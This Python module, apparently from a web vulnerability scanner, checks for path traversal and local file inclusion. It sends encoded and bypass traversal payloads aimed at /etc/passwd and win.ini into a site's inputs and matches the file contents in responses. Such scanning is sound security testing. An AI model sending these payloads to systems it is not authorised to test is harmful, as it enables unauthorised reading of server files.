"""
path_traversal_check.py -- Path Traversal / Local File Inclusion
(OWASP A01: Broken Access Control).

If a parameter is used to build a file path, `../../../../etc/passwd` can escape
the intended directory and read arbitrary files. We inject a set of traversal
payloads (Unix + Windows, plain and encoded) into each input and look for
unmistakable file-content signatures in the response.

Read-only: we only try to *read* well-known, non-sensitive system files
(/etc/passwd, win.ini) as proof-of-concept. Active check -- authorised targets
only.
"""

from __future__ import annotations

import re

from bs4 import BeautifulSoup

from ._common import fetch, result, SEV_HIGH, STATUS_PASS, STATUS_FAIL, STATUS_INFO
from .points import enumerate_points

NAME = "Path Traversal / LFI"
CATEGORY = "PT"
OWASP = "A01: Broken Access Control"

TIMEOUT = 10

PAYLOADS = [
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd",
    "/etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
]

# Signatures that prove we actually read the target file.
SIGNATURES = [
    re.compile(r"root:.*?:0:0:", re.I),           # /etc/passwd
    re.compile(r"\[extensions\]", re.I),          # win.ini
    re.compile(r"for 16-bit app support", re.I),  # win.ini
    re.compile(r"\[fonts\]", re.I),               # win.ini
]


def _matches(text: str):
    for sig in SIGNATURES:
        m = sig.search(text or "")
        if m:
            return m.group(0)[:50]
    return None


def run(session, url: str) -> dict:
    resp, err = fetch(session, url)
    if err:
        return result("path_traversal", NAME, CATEGORY, STATUS_INFO, SEV_HIGH,
                      f"Could not load the page for path-traversal testing -- {err}.")

    soup = BeautifulSoup(resp.text or "", "html.parser")
    points = enumerate_points(url, soup)

    tested = 0
    for point in points:
        tested += 1
        for payload in PAYLOADS:
            _e, r = point.send(session, payload, TIMEOUT)
            if r is None:
                continue
            sig = _matches(r.text or "")
            if sig:
                return result(
                    "path_traversal", NAME, CATEGORY, STATUS_FAIL, SEV_HIGH,
                    "Path traversal / LFI: a system file was read through user input.",
                    [
                        f"Injection point: {point.label}",
                        f"Payload: {payload}",
                        f"File-content signature matched: '{sig}'",
                    ],
                )

    if tested == 0:
        return result("path_traversal", NAME, CATEGORY, STATUS_INFO, SEV_HIGH,
                      "No forms or URL parameters were available to test for path traversal.")

    return result("path_traversal", NAME, CATEGORY, STATUS_PASS, SEV_HIGH,
                  f"No path traversal / LFI detected across {tested} input(s).",
                  ["Tried Unix & Windows traversal payloads (plain, encoded, double-encoded)."])
